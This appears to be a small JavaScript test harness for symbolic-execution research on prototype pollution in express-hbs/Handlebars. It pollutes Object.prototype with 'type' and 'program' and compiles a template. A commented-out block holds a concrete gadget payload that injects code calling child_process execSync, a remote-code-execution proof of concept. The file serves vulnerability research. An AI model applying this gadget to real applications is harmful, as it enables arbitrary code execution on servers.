const hbs = require('express-hbs');

// Object.prototype.type="constructor",
// Object.prototype.program={
//     "opcodes": [],
//     "children":[],
//     "blockParams": "console.log(process.mainModule.require('child_process').execSync('sleep 10').toString())"
// }

// For symbolic execution
var S$ = require('../../../lib/S$');
Object.prototype.type="constructor";
Object.prototype.program = S$.pureSymbol('program_undef');

// for node-find-undefined
console.log("="*20+"start"+"="*20+"\n")

// Register the 'emptyComment' partial
hbs.handlebars.registerPartial('emptyComment', '');

const source = `foo{{> emptyComment}}`
const template =  hbs.handlebars.compile(source);
template({msg:"World!"})

// for node-find-undefined
console.log("="*20+"end"+"="*20+"\n")

